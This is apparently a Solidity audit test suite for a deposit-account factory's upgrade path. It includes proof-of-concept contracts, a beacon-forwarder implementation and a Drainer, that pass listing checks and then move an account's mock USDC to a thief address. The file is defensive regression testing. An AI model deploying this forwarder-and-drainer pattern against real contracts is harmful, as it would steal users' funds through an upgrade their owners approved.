// SPDX-License-Identifier: LicenseRef-DLTX-Source-1.0
pragma solidity 0.8.37;

import {Credential, DepositAccount} from "../src/DepositAccount.sol";
import {DepositAccountRecord} from "../src/DepositAccountRecord.sol";
import {DepositAccountState} from "../src/DepositAccountState.sol";
import {DepositFactory} from "../src/DepositFactory.sol";
import {Helpers, MockToken, MockTransmitter} from "./Helpers.sol";
import {PredecessorOnly, SuccessorFactory} from "./Upgrade.t.sol";

/// Where a beacon forwarder reads its logic: settable after the listing, outside the forwarder's code.
contract Beacon {
    address public target;

    function set(address t) external {
        target = t;
    }
}

/// The audit's PoC 1: an implementation whose every call runs the beacon's current target. Its code
/// hash never changes while what it runs does.
contract BeaconForwarder {
    Beacon public immutable beacon;

    constructor(Beacon b) {
        beacon = b;
    }

    fallback() external payable {
        address t = beacon.target();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), t, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}

/// What the beacon is re-pointed to: run in the account's storage, it pays the account's balance away.
contract Drainer {
    function drain(address token, address to) external {
        MockToken(token).transfer(to, MockToken(token).balanceOf(address(this)));
    }
}

/*
 * The external audit of 2026-10-26: finding 4 (an upgrade bound consent to an address, never to code),
 * its low on successor factories, and the lows L7 (a copy's sync) and L12 (two records in one second).
 * No fork: Circle's transmitter is a mock etched at its address; version 2 is the test fixture.
 */
contract AuditListingTest is Helpers {
    address constant MT = 0x81D40F21F12A8F0E3252Bccb954D722d4c464B64;
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant THIEF = address(0x7E1EF);
    uint256 constant ARBITRUM = 42161;
    uint256 constant HYPEREVM = 999;
    bytes32 constant BOB = bytes32(uint256(0xB0B));
    bytes32 constant SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    event UpgradeCancelled(address indexed implementation, uint256 due);
    event RecordApplied(uint64 version);
    event RecordIgnored(uint64 received, uint64 current);

    DepositFactory f;
    DepositAccount a;
    address v2;

    function setUp() public {
        vm.chainId(ARBITRUM);
        f = deployFactory();
        vm.prank(RECOVERY);
        f.setTransferKey(TRANSFER);
        vm.etch(MT, address(new MockTransmitter()).code);
        a = deployTwo(f, ALICE, WALLET_A, passkey(PASSKEY_A));
        v2 = newV2(f);
    }

    function slotOf(address acct) internal view returns (address) {
        return address(uint160(uint256(vm.load(acct, SLOT))));
    }

    function deliver(DepositAccount acct, bytes memory body) internal {
        vm.prank(MT);
        rec(acct).handleReceiveFinalizedMessage(3, bytes32(uint256(uint160(address(acct)))), 2000, body);
    }

    /// 0xef0100 ‖ `delegate`: an EIP-7702 delegated EOA's code, which its key re-points at will.
    function delegation(address delegate) internal pure returns (bytes memory) {
        return abi.encodePacked(hex"ef0100", delegate);
    }

    // ── finding 4: the owner signs the code ─────────────────────────────────────────────────

    /// The factory keeps the code hash it accepted, the genesis's from its construction.
    function test_f4_theFactoryKeepsTheAcceptedCodeHash() public {
        assertEq(f.codeHashOf(f.genesis()), f.genesis().codehash);
        assertEq(f.codeHashOf(v2), bytes32(0), "unlisted");
        list(f, v2);
        assertEq(f.codeHashOf(v2), v2.codehash);
        (uint64 due,) = f.proposals(v2);
        assertEq(due, 0, "the proposal is gone, its hash kept");
    }

    /// The owner's signature names the version and the code hash; either one wrong is refused.
    function test_f4_theOwnerSignsTheVersionAndTheCodeHash() public {
        list(f, v2);
        address v3 = newV3(f);
        list(f, v3);
        DepositAccountRecord r = rec(a);
        uint256 nonce = a.recordNonceOf(credOf(WALLET_A));
        uint256 deadline = vm.getBlockTimestamp() + 1 hours;
        // the wrong version for v2, then v3's hash for v2
        bytes32 h2 = v2.codehash;
        bytes32 h3 = v3.codehash;
        bytes memory sig = sign(WALLET_A, scheduleDigest(a, v2, 3, h2, nonce, deadline));
        vm.expectRevert(DepositAccountState.BadImplementation.selector);
        r.scheduleUpgrade(v2, 3, h2, nonce, deadline, sig);
        sig = sign(WALLET_A, scheduleDigest(a, v2, 2, h3, nonce, deadline));
        vm.expectRevert(DepositAccountState.BadImplementation.selector);
        r.scheduleUpgrade(v2, 2, h3, nonce, deadline, sig);
        // a signature over other terms than those submitted
        sig = sign(WALLET_A, scheduleDigest(a, v2, 2, h2, nonce, deadline));
        vm.expectRevert(DepositAccountState.BadSignature.selector);
        r.scheduleUpgrade(v2, 2, h3, nonce, deadline, sig);
        // the right terms
        r.scheduleUpgrade(v2, 2, h2, nonce, deadline, sig);
        (address impl, uint256 v,) = a.pendingUpgrade();
        assertEq(impl, v2);
        assertEq(v, 2);
    }

    /// PoC 1b: an EIP-7702 delegated EOA has 23 bytes of "code" and answered every listing check; it
    /// is refused at the proposal, as the implementation and as its module.
    function test_poc1b_a7702DelegationIsRefusedAtProposal() public {
        address eoa = address(0x7702);
        vm.etch(eoa, delegation(v2));
        vm.prank(RECOVERY);
        vm.expectRevert(DepositFactory.BadImplementation.selector);
        f.proposeImplementation(eoa);
        // a well-formed main contract whose module is a delegated EOA (its constructor pinned the
        // delegation's own hash)
        address moduleEoa = address(0x7703);
        vm.etch(moduleEoa, delegation(DepositAccount(v2).module()));
        address impl = vm.deployCode(
            "DepositAccountV2.sol:DepositAccountV2", abi.encode(address(f), moduleEoa, moduleEoa.codehash)
        );
        assertEq(DepositAccount(impl).moduleCodeHash(), moduleEoa.codehash);
        vm.prank(RECOVERY);
        vm.expectRevert(DepositFactory.BadImplementation.selector);
        f.proposeImplementation(impl);
    }

    /// The module must still have the code hash its implementation was built for, at the proposal and
    /// at the acceptance.
    function test_f4_theModuleHasTheHashItsImplementationPins() public {
        address m = DepositAccount(v2).module();
        bytes memory original = m.code;
        vm.etch(m, address(newV3(f)).code); // any other code
        vm.prank(RECOVERY);
        vm.expectRevert(DepositFactory.BadImplementation.selector);
        f.proposeImplementation(v2);
        vm.etch(m, original);
        vm.prank(RECOVERY);
        f.proposeImplementation(v2);
        vm.etch(m, address(newV3(f)).code);
        vm.warp(vm.getBlockTimestamp() + 7 days);
        vm.prank(RECOVERY);
        vm.expectRevert(DepositFactory.BadImplementation.selector);
        f.acceptImplementation(v2);
        vm.etch(m, original);
        vm.prank(RECOVERY);
        f.acceptImplementation(v2);
        assertEq(f.versionOf(v2), 2);
    }

    /// PoC 1c (the 7702 re-delegation's shape): the code at a LISTED address changes after its
    /// listing. The schedule refuses it under either hash, an apply clears a schedule made before,
    /// and a copy refuses to follow (the message stays relayable) until the listed code is back.
    function test_poc1c_codeMovedAfterTheListingNeitherSchedulesNorAppliesNorFollows() public {
        list(f, v2);
        bytes32 listed = v2.codehash;
        bytes memory original = v2.code;
        bytes memory other = address(newV3(f)).code;
        DepositAccountRecord r = rec(a);

        // a schedule made while the code was the listed one, then the code moves: cleared, not applied
        uint256 due = scheduleUpgrade(a, WALLET_A, v2);
        vm.etch(v2, other);
        vm.warp(due);
        vm.expectEmit(true, false, false, true, address(a));
        emit UpgradeCancelled(v2, due);
        vm.prank(STRANGER);
        r.applyUpgrade();
        assertEq(slotOf(address(a)), f.genesis(), "the slot did not move");
        (address pending,,) = a.pendingUpgrade();
        assertEq(pending, address(0), "the schedule is gone");

        // a new schedule: refused with the listed hash (not the code there) and with the code's hash
        // (not the listed one)
        uint256 nonce = a.recordNonceOf(credOf(WALLET_A));
        uint256 deadline = vm.getBlockTimestamp() + 1 hours;
        bytes memory sig = sign(WALLET_A, scheduleDigest(a, v2, 2, listed, nonce, deadline));
        vm.expectRevert(DepositAccountState.BadImplementation.selector);
        r.scheduleUpgrade(v2, 2, listed, nonce, deadline, sig);
        bytes32 moved = v2.codehash;
        sig = sign(WALLET_A, scheduleDigest(a, v2, 2, moved, nonce, deadline));
        vm.expectRevert(DepositAccountState.BadImplementation.selector);
        r.scheduleUpgrade(v2, 2, moved, nonce, deadline, sig);

        // a copy: the home's message (the listed hash) and one naming the code's hash both revert
        vm.chainId(HYPEREVM);
        DepositAccount copy = DepositAccount(f.deploy(BOB, one(wallet(WALLET_A))));
        uint64 t = uint64(vm.getBlockTimestamp());
        vm.prank(MT);
        vm.expectRevert(DepositAccountState.BadImplementation.selector);
        rec(copy).handleReceiveFinalizedMessage(3, bytes32(uint256(uint160(address(copy)))), 2000, upgradeBody(v2, listed, t));
        vm.prank(MT);
        vm.expectRevert(DepositAccountState.BadImplementation.selector);
        rec(copy).handleReceiveFinalizedMessage(3, bytes32(uint256(uint160(address(copy)))), 2000, upgradeBody(v2, moved, t));
        // a message naming another hash than the listed one, the listed code back: still refused
        vm.etch(v2, original);
        vm.prank(MT);
        vm.expectRevert(DepositAccountState.BadImplementation.selector);
        rec(copy).handleReceiveFinalizedMessage(
            3, bytes32(uint256(uint160(address(copy)))), 2000, upgradeBody(v2, bytes32(uint256(1)), t)
        );
        // the listed code and the listed hash: followed
        deliver(copy, upgradeBody(v2, listed, t));
        assertEq(copy.implementation(), v2);
    }

    /// PoC 1, what stays the 7-day review's (the audit's fix 3, written in proposeImplementation's
    /// NatSpec): a forwarder whose logic is a beacon's target passes every on-chain check, keeps
    /// one code hash, and runs a drainer once the beacon is re-pointed. RESIDUAL by design: no check
    /// of code hashes can see a target read from outside the code; the review must refuse such code.
    function test_poc1_beaconImplementationPassesTheListingThenDrains() public {
        vm.etch(USDC, address(new MockToken()).code);
        MockToken(USDC).mint(address(a), 1_000e6);
        Beacon beacon = new Beacon();
        beacon.set(v2);
        address fwd = address(new BeaconForwarder(beacon));
        bytes32 h = fwd.codehash;
        list(f, fwd);
        assertEq(f.versionOf(fwd), 2);
        upgradeNow(a, WALLET_A, fwd);
        assertEq(slotOf(address(a)), fwd);
        beacon.set(address(new Drainer()));
        assertEq(fwd.codehash, h, "the hash the owner signed never moved");
        vm.prank(THIEF);
        Drainer(address(a)).drain(USDC, THIEF);
        assertEq(MockToken(USDC).balanceOf(THIEF), 1_000e6, "the review's to refuse, not the contract's");
    }

    // ── the low on successor factories ──────────────────────────────────────────────────────

    /// PoC 2: a version whose factory is a successor answering only `predecessor()` would brick every
    /// exit of an account moved to it (`factory` is an immutable of the implementation): refused at the
    /// proposal; a successor answering the account's calls is listed.
    function test_poc2_aSuccessorWithoutTheFactoryInterfaceBricksEveryExit() public {
        PredecessorOnly bare = new PredecessorOnly(address(f));
        address bad = newVersion(
            DepositFactory(address(bare)), "DepositAccountV2.sol:DepositAccountRecordV2", "DepositAccountV2.sol:DepositAccountV2"
        );
        vm.prank(RECOVERY);
        vm.expectRevert(DepositFactory.BadImplementation.selector);
        f.proposeImplementation(bad);
        // a successor whose transfer key is no address (a dirty word) is refused too
        BadWordFactory dirty = new BadWordFactory(address(f));
        address bad2 = newVersion(
            DepositFactory(address(dirty)), "DepositAccountV2.sol:DepositAccountRecordV2", "DepositAccountV2.sol:DepositAccountV2"
        );
        vm.prank(RECOVERY);
        vm.expectRevert(DepositFactory.BadImplementation.selector);
        f.proposeImplementation(bad2);
        SuccessorFactory good = new SuccessorFactory(address(f));
        address ok = newVersion(
            DepositFactory(address(good)), "DepositAccountV2.sol:DepositAccountRecordV2", "DepositAccountV2.sol:DepositAccountV2"
        );
        list(f, ok);
        assertEq(f.versionOf(ok), 2);
    }

    // ── L7: a copy's sync is the full `synced()` ────────────────────────────────────────────

    /// A copy whose record expired (RECORD_TTL) takes no authorisation and funds nothing, until the
    /// home's record arrives again.
    function test_L7_anExpiredCopyTakesNoAuthorisationAndFundsNothing() public {
        vm.chainId(HYPEREVM);
        DepositAccount copy = DepositAccount(f.deploy(BOB, one(wallet(WALLET_A))));
        deliverRecordTo(copy, 1, uint64(vm.getBlockTimestamp()));
        assertTrue(copy.synced());
        vm.warp(vm.getBlockTimestamp() + copy.RECORD_TTL() + 1);
        assertFalse(copy.synced());
        bytes memory auth = abi.encode(copy.AUTH_TAG(), uint256(1), address(0xFAC), bytes32("s"), bytes32("c"), uint256(5e6));
        vm.prank(MT);
        vm.expectRevert(DepositAccountState.NotSynced.selector);
        rec(copy).handleReceiveFinalizedMessage(3, bytes32(uint256(uint160(address(copy)))), 2000, auth);
        vm.prank(TRANSFER);
        vm.expectRevert(DepositAccountState.NotSynced.selector);
        copy.fund(address(0xFAC), address(0xA0), 1);
        // renewed: the same authorisation applies
        deliverRecordTo(copy, 1, uint64(vm.getBlockTimestamp()));
        deliver(copy, auth);
        assertTrue(copy.authorisationApplied(1));
    }

    // ── L12: two records of the same second ─────────────────────────────────────────────────

    /// The home publishes version n, then version n + 1 in the same second; relayed in that order,
    /// the copy takes both: (version, publishedAt) compared in that order.
    function test_L12_aHigherVersionPublishedInTheSameSecondIsTaken() public {
        vm.chainId(HYPEREVM);
        DepositAccount copy = DepositAccount(f.deploy(BOB, one(wallet(WALLET_A))));
        uint64 t = uint64(vm.getBlockTimestamp());
        deliverRecordTo(copy, 1, t);
        vm.expectEmit(false, false, false, true, address(copy));
        emit RecordApplied(2);
        deliverRecordTo(copy, 2, t);
        assertEq(copy.version(), 2);
        // the same (version, second) again, and a lower version published later: ignored
        vm.expectEmit(false, false, false, true, address(copy));
        emit RecordIgnored(2, 2);
        deliverRecordTo(copy, 2, t);
        vm.expectEmit(false, false, false, true, address(copy));
        emit RecordIgnored(1, 2);
        deliverRecordTo(copy, 1, t + 1);
        assertEq(copy.version(), 2);
        // the same version published later: a renewal
        vm.warp(t + 10);
        deliverRecordTo(copy, 2, t + 10);
        assertEq(copy.recordPublishedAt(), t + 10);
    }

    function deliverRecordTo(DepositAccount acct, uint64 version, uint64 publishedAt) internal {
        bytes memory body = abi.encode(acct.RECORD_TAG(), version, publishedAt, DEST, one(wallet(WALLET_A)));
        deliver(acct, body);
    }
}

/// A successor whose `transferKey()` answers a word that is no address: an account's call would
/// revert decoding it. Every other call answers as `SuccessorFactory`'s.
contract BadWordFactory {
    address public immutable predecessor;

    constructor(address p) {
        predecessor = p;
    }

    function transferKey() external pure returns (address) {
        assembly {
            mstore(0, not(0))
            return(0, 32)
        }
    }

    function feeRecipient() external pure returns (address) {
        return address(0);
    }

    function stopped(uint256) external pure returns (bool) {
        return false;
    }

    function versionOf(address) external pure returns (uint256) {
        return 0;
    }

    function codeHashOf(address) external pure returns (bytes32) {
        return bytes32(0);
    }
}
